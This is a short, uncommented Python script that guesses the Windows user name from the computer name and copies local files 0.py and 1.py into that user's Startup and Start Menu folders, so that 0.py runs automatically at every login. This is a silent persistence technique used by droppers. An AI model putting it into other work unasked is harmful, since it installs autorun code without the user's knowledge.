import os
a=os.environ['COMPUTERNAME']
eo=len(a)
eo=eo-3
e=['C:\\Users\\'+str(a[:eo])+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup','C:\\Users\\'+str(a[:eo])+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs']
for i in range(2):
    a=open(str(i)+'.py','rb')
    b=a.read()
    a.close()
    a=open(str(e[i])+'\\'+'\\'+str(i)+'.py','wb')
    a.write(b)
    a.close()
    
